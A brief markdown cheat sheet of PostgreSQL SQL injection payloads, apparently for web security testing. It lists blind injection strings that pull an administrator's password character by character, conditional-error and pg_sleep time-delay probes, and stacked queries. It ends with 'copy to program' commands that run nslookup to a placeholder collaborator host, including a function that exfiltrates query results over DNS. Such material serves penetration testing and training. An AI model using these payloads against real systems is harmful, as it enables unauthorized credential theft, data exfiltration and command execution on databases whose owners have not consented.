## summary

Useful SQL commands for postgresql dbms

## string concatenation
`'foo'||'bar'`

## substring
`SUBSTRING('foobar', 4, 2)`

## comments
`--comments`

`/*comments*/`

## database version
`select version()`

## database contents
`select * from information_schema.tables`

`select table_name from information_schema.tables`

`select * from information_schema.columns where table_name = 'TABLE-NAME-HERE'`

`select column_name from information_schema.columns where table_name = 'TABLE-NAME-HERE'`

## blind queries
### samples
`xyz' and (select version() like 'Posgre%25')--`

`xyz' and (select username from users limit 1)='administrator'--`

`xyz' and SUBSTRING((select password from users where username='administrator'),1,1)='a'`

`xyz' and (select 'a' from users where username='administrator' and LENGTH(password)<90)='a'--`

## conditional errors
`select case when (YOUR-CONDITION-HERE) then cast(1/0 as text) else null end`

## batched (or stacked) queries
`query-1-here; query-2-here`

## time delays
`select pg_sleep(10)`

### samples
`xyz'; select pg_sleep(10)--`

`xyz'; (select pg_sleep(10) from users where username='administrator' and substring(password,1,1)>'a')--`

## conditional time delays
`select case when (YOUR-CONDITION-HERE) then pg_sleep(10) else pg_sleep(0) end`

## dns lookup
`copy (select '') to program 'nslookup YOUR-COLLABORATOR.burpcollaborator.net'`

## dns lookup with data exfiltration
`create or replace function f() returns void as $$ declare c text; declare p text; begin select into p (select YOUR-QUERY-HERE); c := 'copy (select '''') to program ''nslookup '||p||'.YOUR-COLLABORATOR.burpcollaborator.net'''; execute c; end; $$ language plpgsql security definer; select f(); 


